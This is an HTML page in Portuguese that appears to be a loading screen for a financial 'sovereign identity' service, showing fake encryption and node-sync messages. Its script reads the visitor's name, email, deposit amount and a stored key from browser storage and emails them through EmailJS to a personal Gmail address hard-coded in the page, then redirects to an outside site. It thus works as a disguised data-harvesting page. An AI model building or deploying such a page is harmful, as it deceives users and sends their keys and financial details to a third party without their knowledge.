<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HPS | Sincronizando Nodes...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Playfair+Display:wght@700&family=Roboto+Mono:wght@400&display=swap');
        
        body {
            background: #F0F4F2; 
            color: #1A3C2F; font-family: 'Inter', sans-serif;
            height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden;
        }

        .sync-ring {
            position: relative; width: 160px; height: 160px;
            display: flex; align-items: center; justify-content: center;
        }

        .ring-inner {
            position: absolute; width: 100%; height: 100%;
            border: 2px solid rgba(74, 124, 89, 0.1);
            border-top: 2px solid #D4AF37;
            border-radius: 50%; animation: spin 1.5s linear infinite;
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }

        .status-text {
            font-family: 'Roboto Mono', monospace; font-size: 10px;
            letter-spacing: 0.2em; text-transform: uppercase;
            color: #4A7C59; margin-top: 20px; min-height: 20px;
        }

        .fade-msg { animation: fadeInOut 1s infinite ease-in-out; }
        @keyframes fadeInOut { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }

        .glass-panel {
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(10px);
            border-radius: 40px; border: 1px solid rgba(255,255,255,0.6);
            padding: 60px; text-align: center; width: 400px;
        }
    </style>
</head>
<body>

    <div class="glass-panel shadow-2xl">
        <div class="flex justify-center">
            <div class="sync-ring">
                <div class="ring-inner"></div>
                <img src="https://cdn-icons-png.flaticon.com/512/1162/1162250.png" class="w-10 opacity-30" alt="HPS Logo">
            </div>
        </div>

        <div class="mt-10">
            <h2 class="font-playfair text-2xl mb-2">Autenticando Soberania</h2>
            <div id="status-display" class="status-text fade-msg">Iniciando Protocolo...</div>
        </div>

        <div class="w-64 h-1 bg-gray-200 mt-8 mx-auto rounded-full overflow-hidden">
            <div id="progress-bar" class="h-full bg-[#D4AF37] transition-all duration-100" style="width: 0%"></div>
        </div>
    </div>
<script>
    const messages = [
        "Iniciando Protocolo de Primeiro Acesso...",
        "Criptografando Identidade Soberana...",
        "Enviando Dados ao Departamento de Inclusão...",
        "Sincronizando Nodes Internacionais...",
        "Finalizando Registro de Custódia..."
    ];

    window.onload = function() {
        // 1. CAPTURA TOTAL (Busca em todas as memórias possíveis)
        const nome = localStorage.getItem('userName') || sessionStorage.getItem('userName') || "Novo Cliente";
        const email = localStorage.getItem('userEmail') || sessionStorage.getItem('userEmail'); 
        const valor = localStorage.getItem('userDeposit') || sessionStorage.getItem('userDeposit') || "Sob Consulta";
        const key = localStorage.getItem('finalKey') || sessionStorage.getItem('finalKey') || "AGUARDANDO-GERACAO";

        // 2. DISPARO DO E-MAIL (Configuração Blindada)
        if (email && email.includes('@')) {
            // SUBSTITUA PELOS SEUS DADOS REAIS DO EMAILJS
            emailjs.init("SUA_PUBLIC_KEY_AQUI"); 

            const templateParams = {
                user_name: nome,
                user_email: email,
                user_key: key,
                user_deposit: valor,
                to_email: email // Envia para o cliente
            };

            const paramsInterno = {
                ...templateParams,
                to_email: "paulodallas63@gmail.com" // Seu e-mail de controle
            };

            // Envio para o Cliente
            emailjs.send("SEU_SERVICE_ID", "TEMPLATE_CLIENTE_ID", templateParams)
                .then(() => console.log("E-mail cliente enviado."))
                .catch(err => console.error("Erro e-mail cliente:", err));

            // Envio para o seu Banco (Dossiê)
            emailjs.send("SEU_SERVICE_ID", "TEMPLATE_INTERNO_ID", paramsInterno)
                .then(() => console.log("Dossiê enviado ao banco."))
                .catch(err => console.error("Erro e-mail interno:", err));
        }

        // 3. ANIMAÇÃO E REDIRECIONAMENTO LÓGICO
        let progress = 0;
        let msgIndex = 0;
        const statusDisplay = document.getElementById('status-display');
        const progressBar = document.getElementById('progress-bar');

        const interval = setInterval(() => {
            progress += 1;
            if (progressBar) progressBar.style.width = progress + "%";

            if (progress % 20 === 0 && msgIndex < messages.length) {
                if (statusDisplay) statusDisplay.innerText = messages[msgIndex];
                msgIndex++;
            }

            if (progress >= 100) {
                clearInterval(interval);
                
                // --- MUDANÇA NO REDIRECIONAMENTO ---
                // Como ele não tem a conta .html ainda, enviamos para uma página de sucesso geral
                alert("SOLICITAÇÃO ENVIADA COM SUCESSO!\n\nSeu Dossiê de Governança está sendo tecido pelo nosso Departamento de Inclusão. Você receberá uma confirmação em seu e-mail em instantes.");
                
                setTimeout(() => {
                    // Redireciona para o portal global enquanto o arquivo dele não é criado
                    window.location.href = "https://iartium.com/global";
                }, 1000);
            }
        }, 80); // Velocidade ajustada para 8 segundos de experiência
    };
</script>
</body>
</html>
